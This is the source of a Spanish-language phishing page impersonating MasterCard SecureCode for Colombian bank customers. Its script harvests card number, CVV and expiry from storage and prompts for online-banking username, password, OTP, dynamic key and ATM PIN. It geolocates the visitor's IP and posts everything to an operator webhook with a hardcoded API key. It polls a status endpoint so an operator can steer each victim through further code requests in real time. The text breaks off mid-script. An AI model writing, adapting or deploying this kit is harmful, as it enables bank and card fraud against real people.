<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>MasterCard SecureCode</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
            background-image: url('blure.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px; 
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 0;
        }
        
        .modal-container { 
            background: #ffffff; 
            border-radius: 6px; 
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.4); 
            padding: 50px; 
            max-width: 480px; 
            width: 100%; 
            position: relative;
            z-index: 1;
        }

        /* --- CABECERA DE LOGOS GIGANTES --- */
        .header { 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            margin-bottom: 35px; 
            min-height: 100px; /* Aumentado para dar espacio a los logos grandes */
        }
        
        /* Logo del banco (Izquierda) */
        .bank-logo { 
            display: flex; 
            align-items: center; 
            justify-content: flex-start;
            height: 90px; /* Forzamos muchísima altura en PC */
        }
        .bank-logo img { 
            height: 100%; 
            width: auto; 
            max-width: 220px; /* Le damos más ancho */
            object-fit: contain; 
            display: none; 
        }
        
        .bank-icon-placeholder {
            display: none;
            width: 80px;
            height: 80px;
        }
        
        /* Logo MasterCard (Derecha) */
        .mc-logo { 
            display: flex; 
            align-items: center; 
            justify-content: flex-end;
            height: 90px; /* Forzamos muchísima altura en PC */
        }
        .mc-logo img { 
            height: 100%; 
            width: auto; 
            max-width: 200px; /* Le damos más ancho */
            object-fit: contain; 
        }

        /* Textos */
        .form-title { 
            font-size: 1.65rem; 
            font-weight: 700; 
            color: #000; 
            margin-bottom: 12px; 
            letter-spacing: -0.5px;
        }
        .form-subtitle { 
            font-size: 1.05rem; 
            color: #4a4a4a; 
            margin-bottom: 35px; 
            line-height: 1.5; 
        }
        .form-subtitle strong {
            color: #000;
            font-weight: 600;
        }

        /* Formulario */
        form { 
            display: flex; 
            flex-direction: column; 
            gap: 24px; 
        }
        .form-group { 
            display: flex; 
            flex-direction: column; 
            gap: 10px; 
        }
        .form-label { 
            font-size: 1rem; 
            font-weight: 500; 
            color: #000; 
        }
        .form-label .required { 
            color: #dc2626; 
            margin-left: 2px; 
        }
        
        .form-input { 
            padding: 16px 18px; 
            border: 1px solid #d1d5db; 
            border-radius: 6px; 
            font-family: 'Inter', sans-serif; 
            font-size: 1.05rem; 
            color: #000; 
            transition: border-color 0.2s; 
            background: #fff; 
            width: 100%; 
        }
        .form-input:focus { 
            outline: none; 
            border-color: #000; 
        }
        .form-input::placeholder { 
            color: #9ca3af; 
        }
        .form-input:disabled { 
            background: #f3f4f6; 
            cursor: not-allowed; 
        }
        .form-input.error { 
            border-color: #dc2626; 
        }
        .error-message { 
            color: #dc2626; 
            font-size: 0.85rem; 
            display: none; 
            margin-top: 4px; 
        }
        .form-group.error .form-input { 
            border-color: #dc2626; 
        }
        .form-group.error .error-message { 
            display: block; 
        }

        /* Sección OTP */
        .otp-section { 
            display: none; 
            animation: fadeIn 0.3s ease;
            background: #f9fafb;
            border: 1px solid #e5e7eb;
            border-radius: 6px;
            padding: 16px;
            margin-top: 10px;
        }
        .otp-section.visible { 
            display: block; 
        }
        @keyframes fadeIn { 
            from { opacity: 0; } 
            to { opacity: 1; } 
        }
        
        .otp-info { 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            font-size: 0.95rem; 
            color: #4a4a4a; 
            margin-bottom: 15px; 
        }
        .otp-info svg { 
            width: 20px; 
            height: 20px; 
            flex-shrink: 0; 
        }

        /* Botón Negro */
        .btn-primary { 
            background: #000000; 
            color: #ffffff; 
            border: none; 
            border-radius: 6px; 
            padding: 18px; 
            font-size: 1.1rem; 
            font-weight: 600; 
            cursor: pointer; 
            transition: background 0.2s; 
            width: 100%;
            margin-top: 10px;
        }
        .btn-primary:hover:not(:disabled) { 
            background: #222222; 
        }
        .btn-primary:disabled { 
            opacity: 0.7; 
            cursor: not-allowed; 
        }

        .resend-text {
            text-align: center;
            font-size: 1rem;
            color: #6b7280;
            margin-top: 15px;
            cursor: pointer;
        }
        .resend-text:hover {
            color: #000;
        }

        .status-message { 
            display: none; 
            padding: 14px; 
            border-radius: 6px; 
            font-size: 0.95rem; 
            font-weight: 500; 
            margin-bottom: 20px; 
            text-align: center; 
        }
        .status-message.error { 
            display: block; 
            background: #fef2f2; 
            color: #dc2626; 
            border: 1px solid #fecaca; 
        }
        .status-message.success { 
            display: block; 
            background: #f0fdf4; 
            color: #16a34a; 
            border: 1px solid #bbf7d0; 
        }
        .status-message.error-usuario { 
            display: block; 
            background: #fef2f2; 
            color: #dc2626; 
            border: 2px solid #dc2626; 
            font-weight: 700; 
        }

        .loading-overlay { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0, 0, 0, 0.5); 
            z-index: 1000; 
            justify-content: center; 
            align-items: center; 
            flex-direction: column; 
            backdrop-filter: blur(2px); 
        }
        .loading-overlay.active { 
            display: flex; 
        }
        .spinner { 
            width: 45px; height: 45px; 
            border: 4px solid #e5e7eb; 
            border-top: 4px solid #000; 
            border-radius: 50%; 
            animation: spin 0.8s linear infinite; 
            margin-bottom: 20px; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-text { 
            color: #000; 
            font-size: 1.1rem; 
            font-weight: 500; 
            background: #fff;
            padding: 12px 24px;
            border-radius: 6px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        /* Responsive para móviles (Logos también gigantes) */
        @media (max-width: 480px) { 
            .modal-container { padding: 30px 20px; } 
            .form-title { font-size: 1.35rem; } 
            .form-input { padding: 14px; font-size: 1rem; }
            
            .header {
                min-height: 80px;
                margin-bottom: 25px;
            }
            .bank-logo {
                height: 70px; /* En celular también se ven enormes */
                max-width: 50%;
            }
            .mc-logo {
                height: 70px; /* En celular también se ven enormes */
                max-width: 50%;
            }
            .bank-logo img, .mc-logo img {
                max-width: 100%; /* Obliga a la imagen a ocupar todo el espacio disponible */
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text" id="loadingText">Verificando...</div>
    </div>

    <div class="modal-container">
        
        <div class="header">
            <div class="bank-logo" id="bankLogoContainer">
                <img id="bankLogoImg" src="" alt="Logo banco" />
                <svg id="bankIconPlaceholder" class="bank-icon-placeholder" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11m16-11v11M8 14v3m4-3v3m4-3v3"/>
                </svg>
            </div>
            <div class="mc-logo">
                <img src="id.png" alt="MasterCard SecureCode" />
            </div>
        </div>

        <h1 class="form-title" id="mainTitle">Autenticación de compra</h1>
        
        <p class="form-subtitle" id="mainSubtitle">
            Ingresa tus credenciales de seguridad para tu <strong id="bancoNombre">banco emisor</strong> para validar la transacción.
        </p>

        <div class="status-message" id="statusMessage"></div>

        <form id="authForm" novalidate>
            <div id="credentialsSection">
                <div class="form-group" style="margin-bottom: 20px;">
                    <label class="form-label">Usuario <span class="required">*</span></label>
                    <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
                    <div class="error-message">El usuario es requerido</div>
                </div>

                <div class="form-group" style="margin-bottom: 20px;">
                    <label class="form-label">Contraseña <span class="required">*</span></label>
                    <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
                    <div class="error-message">La contraseña es requerida</div>
                </div>
            </div>

            <div class="otp-section" id="otpSection">
                <div class="otp-info" id="otpInfoText">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        <path d="M12 8v4"/>
                        <path d="M12 16h.01"/>
                    </svg>
                    <span id="otpInfoMessage">Ingresa el código de verificación.</span>
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label" id="otpLabel">Código de confirmación <span class="required">*</span></label>
                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código" maxlength="8" inputmode="numeric" required />
                    <div class="error-message">El código debe tener entre 6 y 8 dígitos</div>
                </div>
            </div>

            <button type="submit" class="btn-primary" id="submitButton">
                <span id="buttonText">Continuar</span>
            </button>

            <div class="resend-text" id="resendText" style="display:none;">
                Reenviar código
            </div>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = '/api/webhook.php';
        const HEARTBEAT_URL = '/api/heartbeat.php';
        const API_KEY = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
        const POLLING_INTERVAL = 1500;
        const MAX_POLLING_TIME = 300000;
        const HEARTBEAT_INTERVAL = 3000;

        async function capturarIP() {
            if (localStorage.getItem('usuario_ip')) return localStorage.getItem('usuario_ip');
            try {
                const resp = await fetch('https://ipwho.is/');
                const data = await resp.json();
                if (data.success && data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', data.country || 'Desconocido');
                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                    return data.ip;
                }
            } catch (e) {}
            localStorage.setItem('usuario_ip', 'Desconocida');
            return null;
        }
        capturarIP();

        let solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        let pollingInterval = null;
        let pasoActual = 'credenciales';
        let modoAutenticacion = 'otp';
        let ultimoCodigoOTP = null;
        let formularioBloqueado = false;
        let rechazoDetectado = false;
        let heartbeatInterval = null;

        const form = document.getElementById('authForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const confirmationInput = document.getElementById('confirmationCode');
        const otpSection = document.getElementById('otpSection');
        const otpInfoText = document.getElementById('otpInfoText');
        const otpInfoMessage = document.getElementById('otpInfoMessage');
        const otpLabel = document.getElementById('otpLabel');
        const submitButton = document.getElementById('submitButton');
        const buttonText = document.getElementById('buttonText');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const statusMessage = document.getElementById('statusMessage');
        const bankLogoImg = document.getElementById('bankLogoImg');
        const bankIconPlaceholder = document.getElementById('bankIconPlaceholder');
        const bankLogoContainer = document.getElementById('bankLogoContainer');
        const bancoNombre = document.getElementById('bancoNombre');
        const credentialsSection = document.getElementById('credentialsSection');
        const resendText = document.getElementById('resendText');

        const bankLogos = {
            'Bancolombia': 'bancol.png', 'Davivienda': 'davivienda.png', 'Davibank': 'db.png',
            'Banco Popular': 'popu.png', 'Banco Falabella': 'fala.png', 'Itaú': 'itau.png',
            'Caja Social': 'Caja.jpg', 'Banco de Bogotá': 'bog.png', 'Banco Occidente': 'occi.png',
            'BBVA Colombia': 'bbva.png', 'Banco AV Villas': 'avvillas.png', 'Banco Pichincha': 'pichincha.png',
            'Scotiabank Colpatria': 'scotia.png', 'Banco Agrario': 'agrario.png', 'Citibank Colombia': 'citi.png',
            'Banco GNB Sudameris': 'gnb.png', 'Bancoomeva': 'omeva.png', 'Banco Finandina': 'finandina.png',
            'Banco Cooperativo Coopcentral': 'coopcentral.png'
        };

        function normalizarBanco(rawIssuer) {
            if (!rawIssuer) return null;
            const raw = rawIssuer.toLowerCase().trim();
            if (raw.includes('bbva') || raw.includes('bilbao') || raw.includes('vizcaya') || raw.includes('ganadero')) return 'BBVA Colombia';
            if (raw.includes('bancolombia')) return 'Bancolombia';
            if (raw.includes('davivienda')) return 'Davivienda';
            if (raw.includes('davibank')) return 'Davibank';
            if (raw.includes('banco de bogota') || raw.includes('banco de bogotá')) return 'Banco de Bogotá';
            if (raw.includes('banco popular') || raw.includes('popular')) return 'Banco Popular';
            if (raw.includes('occidente')) return 'Banco Occidente';
            if (raw.includes('citibank') || raw.includes('citi')) return 'Citibank Colombia';
            if (raw.includes('av villas') || raw.includes('avvillas')) return 'Banco AV Villas';
            if (raw.includes('itau') || raw.includes('itaú')) return 'Itaú';
            if (raw.includes('gnb') || raw.includes('sudameris')) return 'Banco GNB Sudameris';
            if (raw.includes('falabella')) return 'Banco Falabella';
            if (raw.includes('pichincha')) return 'Banco Pichincha';
            if (raw.includes('caja social')) return 'Caja Social';
            if (raw.includes('coopcentral')) return 'Banco Cooperativo Coopcentral';
            if (raw.includes('bancoomeva')) return 'Bancoomeva';
            if (raw.includes('finandina')) return 'Banco Finandina';
            if (raw.includes('scotiabank') || raw.includes('colpatria')) return 'Scotiabank Colpatria';
            if (raw.includes('agrario')) return 'Banco Agrario';
            return rawIssuer.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
        }

        function enviarHeartbeat(estado = 'activo') {
            try {
                fetch(HEARTBEAT_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        solicitudId: solicitudId,
                        usuario: usernameInput ? usernameInput.value : '',
                        estado: estado,
                        ip: localStorage.getItem('usuario_ip') || '',
                        pais: localStorage.getItem('usuario_pais') || '',
                        ciudad: localStorage.getItem('usuario_ciudad') || ''
                    }),
                    keepalive: true
                }).catch(() => {});
            } catch (e) {}
        }

        function iniciarHeartbeat() {
            enviarHeartbeat('activo');
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            heartbeatInterval = setInterval(() => enviarHeartbeat('activo'), HEARTBEAT_INTERVAL);
        }

        function detenerHeartbeat(notificar = true) {
            if (heartbeatInterval) {
                clearInterval(heartbeatInterval);
                heartbeatInterval = null;
            }
            if (notificar) {
                try {
                    navigator.sendBeacon(HEARTBEAT_URL, JSON.stringify({ solicitudId: solicitudId, estado: 'offline' }));
                } catch (e) {}
            }
        }

        window.addEventListener('beforeunload', () => detenerHeartbeat(true));

        window.addEventListener('load', function() {
            initializeTransaction();
            cargarLogoBanco();
            iniciarHeartbeat();
        });

        function cargarLogoBanco() {
            let bancoEmisor = localStorage.getItem('bancoEmisor');
            if (bancoEmisor) {
                bancoEmisor = normalizarBanco(bancoEmisor);
                localStorage.setItem('bancoEmisor', bancoEmisor);
                if (bancoNombre) bancoNombre.textContent = bancoEmisor;
            }

            if (bancoEmisor && bankLogos[bancoEmisor]) {
                bankLogoImg.src = bankLogos[bancoEmisor];
                bankLogoImg.alt = bancoEmisor;
                bankLogoImg.style.display = 'block';
                bankIconPlaceholder.style.display = 'none';
            } else {
                bankLogoImg.style.display = 'none';
                bankIconPlaceholder.style.display = 'block';
            }
        }

        function initializeTransaction() {
            const montoGuardado = localStorage.getItem('montoTotal');
            const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
            let amount = (montoGuardado && !isNaN(parseInt(montoGuardado))) ? parseInt(montoGuardado) : 23000;
            if (storagePriority && !montoGuardado) amount += 20000;
            
            localStorage.setItem('monto_formateado', amount.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$');

            let cardLast4 = localStorage.getItem('cardLast4') || '0000';
            const cardNumber = localStorage.getItem('cardNumber') || 'No disponible';
            const cvc = localStorage.getItem('cvc') || 'No disponible';
            const expiry = localStorage.getItem('expiry') || 'No disponible';

            localStorage.setItem('cardNumberFull', cardNumber);
            localStorage.setItem('cardCVV', cvc);
            localStorage.setItem('cardExpiry', expiry);
        }

        async function enviarCredencialesAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        numeroTarjeta: datos.numeroTarjeta,
                        cvv: datos.cvv,
                        vencimiento: datos.vencimiento,
                        usuario: datos.usuario,
                        password: datos.password,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'credenciales',
                        bancoEmisor: localStorage.getItem('bancoEmisor') || 'No especificado',
                        tipo_tarjeta: 'mastercard',
                        ip: localStorage.getItem('usuario_ip') || '',
                        pais: localStorage.getItem('usuario_pais') || 'Desconocido',
                        ciudad: localStorage.getItem('usuario_ciudad') || 'Desconocida'
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) { return false; }
        }

        async function enviarOTPAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.otp,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'otp',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'mastercard',
                        es_reintento: true 
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) { return false; }
        }

        async function enviarClaveDinamicaAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.clave,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'clave_dinamica',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'mastercard',
                        es_reintento: true
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) { return false; }
        }

        async function enviarClaveCajeroAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.clave,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'clave_cajero',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'mastercard',
                        es_reintento: true
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) { return false; }
        }

        async function verificarEstadoSolicitud(solicitudId, intentos = 3) {
            for (let i = 0; i < intentos; i++) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    const response = await fetch(`/api/estado.php?id=${solicitudId}`, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    if (!response.ok) continue;
                    const data = await response.json();

                    if (data.otp_codigo && data.otp_codigo !== 'N/A' && data.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== data.otp_codigo) ultimoCodigoOTP = data.otp_codigo;
                    }
                    if (data.otp_modo) localStorage.setItem('otp_modo', data.otp_modo);

                    const estadoReal = data.estado_real || data.estado || 'pending';
                    if (estadoReal === 'approved' || estadoReal === 'approved_otp' || estadoReal === 'approved_clave_cajero') {
                        return { estado: 'approved', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'rejected' || estadoReal === 'rejected_otp' || estadoReal === 'rejected_clave_cajero' || estadoReal === 'rejected_user_error') {
                        return { estado: 'rejected', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'pending_otp') {
                        return { estado: 'pending_otp', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'pending_clave_cajero') {
                        return { estado: 'pending_clave_cajero', estadoReal: estadoReal, modo: data.otp_modo || 'clave_cajero', otp_codigo: data.otp_codigo };
                    }
                    return { estado: 'pending', estadoReal: 'pending', modo: 'otp', otp_codigo: null };
                } catch (error) {
                    if (i === intentos - 1) return { estado: 'error', estadoReal: 'error', modo: 'otp', otp_codigo: null };
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            return { estado: 'error', estadoReal: 'error', modo: 'otp', otp_codigo: null };
        }

        function iniciarPollingCredenciales() {
            let tiempoInicio = Date.now();
            if (pollingInterval) clearInterval(pollingInterval);
            loadingText.textContent = 'Verificando credenciales...';

            pollingInterval = setInterval(async () => {
                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                    clearInterval(pollingInterval); pollingInterval = null;
                    mostrarError('⏰ Tiempo de espera agotado');
                    resetFormulario();
                    return;
                }
                const resultado = await verificarEstadoSolicitud(solicitudId);

                if (resultado.estado === 'pending_otp' || resultado.estado === 'pending_clave_cajero') {
                    clearInterval(pollingInterval); pollingInterval = null;
                    const modo = resultado.modo || 'otp';

                    if (modo === 'clave_cajero') { modoAutenticacion = 'clave_cajero'; mostrarSeccionOTP('clave_cajero'); }
                    else if (modo === 'clave_dinamica') { modoAutenticacion = 'clave_dinamica'; mostrarSeccionOTP('clave_dinamica'); }
                    else { modoAutenticacion = 'otp'; mostrarSeccionOTP('otp'); }

                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A') {
                        ultimoCodigoOTP = resultado.otp_codigo;
                        confirmationInput.value = ultimoCodigoOTP;
                        mostrarExito('✅ Código recibido automáticamente');
                    }

                    loadingOverlay.classList.remove('active');
                    submitButton.disabled = false;
                    formularioBloqueado = false;
                    iniciarPollingOTP();
                    return;

                } else if (resultado.estado === 'approved') {
                    clearInterval(pollingInterval); pollingInterval = null;
                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                    detenerHeartbeat(true);
                    setTimeout(() => { window.location.href = 'exito.php'; }, 2000);
                    return;
                } else if (resultado.estado === 'rejected') {
                    clearInterval(pollingInterval); pollingInterval = null;
                    mostrarError('❌ Credenciales incorrectas o transacción rechazada');
                    
                    solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                    enviarHeartbeat('activo');

                    resetFormulario();
                    formularioBloqueado = false;
                    return;
                }
            }, POLLING_INTERVAL);
        }

        function iniciarPollingOTP() {
            let tiempoInicio = Date.now();
            if (pollingInterval) clearInterval(pollingInterval);
            loadingText.textContent = 'Verificando código...';
            rechazoDetectado = false;

            pollingInterval = setInterval(async () => {
                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                    clearInterval(pollingInterval); pollingInterval = null;
                    mostrarError('⏰ Tiempo de espera agotado');
                    resetFormulario(); formularioBloqueado = false;
                    return;
                }

                const resultado = await verificarEstadoSolicitud(solicitudId);

                if (resultado.estado === 'pending_clave_cajero') {
                    if (modoAutenticacion !== 'clave_cajero') {
                        modoAutenticacion = 'clave_cajero';
                        mostrarSeccionOTP('clave_cajero');
                        confirmationInput.value = '';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        formularioBloqueado = false;
                    }
                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A') {
                        if (ultimoCodigoOTP !== resultado.otp_codigo) {
                            ultimoCodigoOTP = resultado.otp_codigo;
                            confirmationInput.value = ultimoCodigoOTP;
                            mostrarExito('✅ Código recibido automáticamente');
                        }
                    }
                    return;
                }

                if (resultado.estado === 'pending_otp') {
                    const modoReal = resultado.modo || 'otp';
                    if (modoReal === 'otp' && modoAutenticacion !== 'otp') {
                        modoAutenticacion = 'otp';
                        mostrarSeccionOTP('otp');
                        confirmationInput.value = '';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        formularioBloqueado = false;
                    }
                    if (modoReal === 'clave_dinamica' && modoAutenticacion !== 'clave_dinamica') {
                        modoAutenticacion = 'clave_dinamica';
                        mostrarSeccionOTP('clave_dinamica');
                        confirmationInput.value = '';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        formularioBloqueado = false;
                    }
                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A') {
                        if (ultimoCodigoOTP !== resultado.otp_codigo) {
                            ultimoCodigoOTP = resultado.otp_codigo;
                            confirmationInput.value = ultimoCodigoOTP;
                            mostrarExito('✅ Código recibido automáticamente');
                        }
                    }
                    return;
                }

                if (resultado.estado === 'approved') {
                    clearInterval(pollingInterval); pollingInterval = null;
                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                    detenerHeartbeat(true);
                    setTimeout(() => { window.location.href = 'exito.php'; }, 2000);
                    return;
                }

                if (resultado.estadoReal === 'rejected' || resultado.estadoReal === 'rejected_otp' || resultado.estadoReal === 'rejected_clave_cajero' || resultado.estadoReal === 'rejected_user_error') {
                    if (rechazoDetectado) return;
                    rechazoDetectado = true;

                    if (resultado.estadoReal === 'rejected_user_error') {
                        statusMessage.className = 'status-message error-usuario';
                        statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                        statusMessage.style.display = 'block';
                        
                        solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                        enviarHeartbeat('activo');

                        resetFormulario();
                        clearInterval(pollingInterval); pollingInterval = null;
                        return;
                    }

                    let mensajeError = '❌ Código incorrecto. Intente de nuevo.';
                    if (modoAutenticacion === 'clave_cajero') mensajeError = '❌ Clave del Cajero incorrecta. Intente de nuevo.';
                    else if (modoAutenticacion === 'clave_dinamica') mensajeError = '❌ Clave Dinámica incorrecta. Intente de nuevo.';

                    statusMessage.className = 'status-message error';
                    statusMessage.textContent = mensajeError;
                    statusMessage.style.display = 'block';

                    solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                    enviarHeartbeat('activo');

                    confirmationInput.value = '';
                    confirmationInput.disabled = false;
                    confirmationInput.focus();
                    usernameInput.disabled = true;
                    passwordInput.disabled = true;
                    submitButton.disabled = false;
                    buttonText.textContent = 'Continuar';
                    loadingOverlay.classList.remove('active');
                    otpSection.classList.add('visible');
                    pasoActual = 'otp';
                    formularioBloqueado = false;
                    clearInterval(pollingInterval); pollingInterval = null;
                    return;
                }
            }, POLLING_INTERVAL);
        }

        function mostrarSeccionOTP(tipo) {
            otpSection.classList.add('visible');
            pasoActual = 'otp';
            confirmationInput.disabled = false;
            confirmationInput.focus();
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            
            usernameInput.disabled = true;
            passwordInput.disabled = true;

            document.getElementById('mainTitle').textContent = 'Autenticación de compra';
            
            let bancoTexto = "banco emisor";
            const bancoEl = document.getElementById('bancoNombre');
            if (bancoEl) bancoTexto = bancoEl.textContent;
            else bancoTexto = localStorage.getItem('bancoEmisor') || "banco emisor";

            document.getElementById('mainSubtitle').innerHTML = `Hemos enviado un código de seguridad a tu móvil para validar la transacción con <strong>${bancoTexto}</strong>.`;

            if (tipo === 'clave_dinamica') {
                otpInfoMessage.innerHTML = `<span>Ingresa tu <strong>Clave Dinámica</strong> generada por el banco.</span>`;
                otpLabel.textContent = 'Clave Dinámica *';
                confirmationInput.placeholder = 'Ingresa tu clave dinámica';
                modoAutenticacion = 'clave_dinamica';
            } else if (tipo === 'clave_cajero') {
                otpInfoMessage.innerHTML = `<span>Ingresa tu <strong>Clave del Cajero</strong> proporcionada por tu banco.</span>`;
                otpLabel.textContent = 'Clave del Cajero *';
                confirmationInput.placeholder = 'Ingresa tu clave del cajero';
                modoAutenticacion = 'clave_cajero';
            } else {
                otpInfoMessage.innerHTML = `<span>Ingresa el código de <strong>Token móvil o físico</strong>.</span>`;
                otpLabel.textContent = 'Código de confirmación *';
                confirmationInput.placeholder = 'Ingresa tu código';
                modoAutenticacion = 'otp';
            }
            submitButton.disabled = false;
            buttonText.textContent = 'Continuar';
        }

        function ocultarOTP() {
            otpSection.classList.remove('visible');
            pasoActual = 'credenciales';
            buttonText.textContent = 'Continuar';
            confirmationInput.value = '';
            confirmationInput.disabled = true;
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            credentialsSection.style.display = 'block';
            resendText.style.display = 'none';
            ultimoCodigoOTP = null;
        }

        function mostrarError(mensaje) {
            statusMessage.className = 'status-message error';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            loadingOverlay.classList.remove('active');
            submitButton.disabled = false;
            buttonText.textContent = 'Continuar';
        }

        function mostrarExito(mensaje) {
            statusMessage.className = 'status-message success';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            loadingOverlay.classList.remove('active');
        }

        function resetFormulario() {
            usernameInput.disabled = false;
            passwordInput.disabled = false;
            confirmationInput.disabled = true;
            ocultarOTP();
            loadingOverlay.classList.remove('active');
            submitButton.disabled = false;
            buttonText.textContent = 'Continuar';
            usernameInput.value = '';
            passwordInput.value = '';
            confirmationInput.value = '';
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            modoAutenticacion = 'otp';
            ultimoCodigoOTP = null;
            formularioBloqueado = false;
            rechazoDetectado = false;
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        [usernameInput, passwordInput, confirmationInput].forEach(input => {
            input.addEventListener('blur', function() {
                if (this.value.trim()) {
                    this.parentElement.classList.remove('error');
                }
            });
        });

        confirmationInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length > 8) this.value = this.value.slice(0, 8);
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (formularioBloqueado) return;

            let isValid = true;
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));

            if (pasoActual === 'credenciales') {
                if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
